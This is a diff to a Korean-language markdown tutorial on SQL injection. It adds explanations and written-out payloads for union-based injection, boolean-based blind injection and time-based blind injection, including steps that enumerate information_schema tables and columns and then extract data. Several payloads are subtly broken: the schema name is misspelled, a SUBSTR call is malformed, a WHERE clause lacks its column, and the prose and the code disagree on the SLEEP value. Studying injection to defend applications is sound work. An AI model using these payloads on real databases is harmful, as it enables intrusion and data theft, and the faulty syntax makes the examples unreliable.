@@ -62,16 +62,57 @@ id만 같다면 뒤에 오는 pw는 무조건 참이 되니깐 말이다.
 <br>
 
 ## Union SQL Injection
+SQL의 Union 키워드를 이용하는 공격기법이다.
+Union은 두 개의 쿼리문에 대한 결과를 합쳐서 하나의 테이블로 보여주는 키워드이다.
+
+union injection을 하기 위해서는 두 가지의 조건이 필요하다.
+두 테이블의 컬럼 수가 같아야하고, 데이터형이 같아야한다.
+
+Example 1.
+
+union injection의 공격흐름이다.
+
 ```
 ' and db_name() > 1 --
 ' union select null --
 ' union select null,null --
-' union select null,null,null --
+' union select null,null,null ... --
 ' union select @@version --
 ' union select table_name,null,null from infromation_schema.tables --
 ' union select column_name,null,null from infromation_schema.columns where = '[table_name]' --
 ' union select [column_name],null,null from [table_name] --
 ```
+
+<br>
+
+## Blind SQL Injection
+### Boolean based SQL
+Boolean based SQL은 데이터베이스로부터 특정한 값이나 데이터를 전달받지 않고 단순히 참과 거짓의 정보만 알 수 있을 때 사용한다.
+
+Example 1.
+
+```
+[ID]’ and ASCII(SUBSTR(SELECT name From information_schema.tables WHERE table_type=’base table’ limit 0,1)1,1)) > 100 --
+```
+해당구문은 MySQL 에서 테이블 명을 조회하는 구문으로 limit 키워드를 통해 하나의 테이블만 조회하고, SUBSTR 함수로 첫 글자만, 그리고 마지막으로 ASCII 를 통해서 ascii 값으로 변환해준다. 
+
+만약에 조회되는 테이블 명이 Users 라면 ‘U’ 자가 ascii 값으로 조회가 될 것이고, 뒤의 100 이라는 숫자 값과 비교를 하게 된다.  
+거짓이면 로그인 실패가 될 것이고, 참이 될 때까지 뒤의 100이라는 숫자를 변경해 가면서 비교를 하면 된다.  
+
+공격자는 이 프로세스를 자동화 스크립트를 통하여 단기간 내에 테이블 명을 알아 낼 수 있다.
+
+### Time based SQL
+Time based SQL도 단순히 참과 거짓으로만 정보를 알 수 있을 때 사용한다.
+
+Example 1.
+
+```
+[]' OR (LENGTH(DATABASE()) = 1 AND SLEEP(3)) --
+```
+
+악의적인 사용자가 []’ OR (LENGTH(DATABASE())=1 AND SLEEP(2)) – 이라는 구문을 주입하였다. 여기서 LENGTH 함수는 문자열의 길이를 반환하고, DATABASE 함수는 데이터베이스의 이름을 반환한다.
+
+주입된 구문에서, LENGTH(DATABASE()) = 1 가 참이면 SLEEP(2) 가 동작하고, 거짓이면 동작하지 않는다. 이를 통해서 숫자 1 부분을 조작하여 데이터베이스의 길이를 알아 낼 수 있다.
 
 <br>
 
